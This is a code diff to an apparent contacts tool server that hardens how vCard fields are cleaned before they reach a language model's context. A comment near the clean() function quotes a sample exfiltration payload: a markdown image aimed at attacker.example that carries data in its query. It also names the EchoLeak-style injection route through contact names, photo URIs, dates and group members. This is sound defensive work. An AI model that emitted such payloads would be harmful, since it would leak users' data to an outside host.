@@ -1,4 +1,4 @@
-import { assess, sanitizeText, stripInvisible } from './analyze.js';
+import { assess, sanitizeShortText, sanitizeText } from './analyze.js';
 import type { AddressBookEntry } from './books.js';
 import { buildEntityId } from './entity-id.js';
 import {
@@ -20,10 +20,13 @@ import {
 /**
  * Turning a parsed card into the object a tool answers with.
  *
- * Every string that came out of a vCard passes through `stripInvisible` or
- * `sanitizeText` on its way here — a contact's own name is somebody else's text
- * as much as a note is, and a `FN` carrying a directional override renders as a
- * different person in the client that displays it.
+ * Every string that came out of a vCard passes through `sanitizeText` (the
+ * multi-line `NOTE`) or `clean` (everything else) on its way here — a contact's
+ * own name is somebody else's text as much as a note is, and a `FN` carrying a
+ * directional override renders as a different person in the client that
+ * displays it. Both run the same three passes; they differ only in whether
+ * paragraph breaks survive and in where the cap sits. There is deliberately no
+ * third path that runs fewer of them.
  *
  * The projection *is* the schema: `output-schema.ts` names the same fields with
  * the same optionality, and where the two would drift the schema is what fails
@@ -58,10 +61,34 @@ const KNOWN_PROPERTIES = new Set([
   'x-addressbookserver-member',
 ]);
 
+/**
+ * The single-line treatment, applied to every string this projection emits.
+ *
+ * It used to be `stripInvisible` alone, which is a weaker thing than it reads
+ * as: an `FN` of `![a](https://attacker.example/x.png?d=…)` survived it intact
+ * and came back through `list_contacts` for a client to render and fetch — the
+ * EchoLeak shape the `NOTE` path had been defusing all along. There is no field
+ * on a card that is safer than `NOTE` merely by being shorter; the writer is
+ * the same stranger either way.
+ */
 function clean(value: string | undefined): string | undefined {
   if (value === undefined) return undefined;
-  const text = stripInvisible(value).trim();
+  const text = sanitizeShortText(value);
   return text.length > 0 ? text : undefined;
+}
+
+/**
+ * A parsed date, with its `raw` put through the same cleaner.
+ *
+ * RFC 6350 permits `BDAY;VALUE=text:the second Tuesday of Advent`, so `raw` is
+ * free text on a path where every other field's is cleaned. The numeric parts
+ * need nothing: they came out of the parser as numbers.
+ */
+function cleanDate(
+  date: ReturnType<typeof readDate>
+): ReturnType<typeof readDate> {
+  if (date === undefined) return undefined;
+  return { ...date, raw: sanitizeShortText(date.raw) };
 }
 
 function cleanList(values: readonly string[]): string[] {
@@ -212,7 +239,12 @@ function shapeCommon(
     const photo: Record<string, unknown> = { storage: info.storage };
     if (info.mediaType !== undefined) photo.media_type = info.mediaType;
     if (info.bytes !== undefined) photo.bytes = info.bytes;
-    if (info.uri !== undefined) photo.uri = info.uri;
+    // Cleaned like any other field. This server never fetches it — that is the
+    // whole reason `openWorldHint` is false — but it is still a string a
+    // stranger chose that lands in the model's context, and a `data:`-shaped
+    // one can be arbitrarily long.
+    const uri = info.uri === undefined ? undefined : clean(info.uri);
+    if (uri !== undefined) photo.uri = uri;
     out.photo = photo;
   }
 
@@ -259,9 +291,9 @@ export function shapeFull(
   const impp = shapeTyped(readTyped(card, 'impp'));
   if (impp.length > 0) out.instant_messaging = impp;
 
-  const birthday = readDate(card, 'bday');
+  const birthday = cleanDate(readDate(card, 'bday'));
   if (birthday !== undefined) out.birthday = birthday;
-  const anniversary = readDate(card, 'anniversary');
+  const anniversary = cleanDate(readDate(card, 'anniversary'));
   if (anniversary !== undefined) out.anniversary = anniversary;
 
   const note = readText(card, 'note');
@@ -379,8 +411,14 @@ export function shapeGroup(
   const members = references.map((reference) => {
     const uid = memberUid(reference);
     const found = uid === undefined ? undefined : resolve(uid);
-    const entry: Record<string, unknown> = { reference };
-    if (uid !== undefined) entry.uid = uid;
+    // `reference` and `uid` are the raw `MEMBER` value and the UID cut out of
+    // it. Both are text from the card, so both are cleaned — a group whose
+    // member line is an image reference would otherwise reach the model
+    // unfenced through `get_group`.
+    const entry: Record<string, unknown> = {
+      reference: sanitizeShortText(reference),
+    };
+    if (uid !== undefined) entry.uid = sanitizeShortText(uid);
     if (found !== undefined) {
       entry.id = found.id;
       const name = clean(found.name);
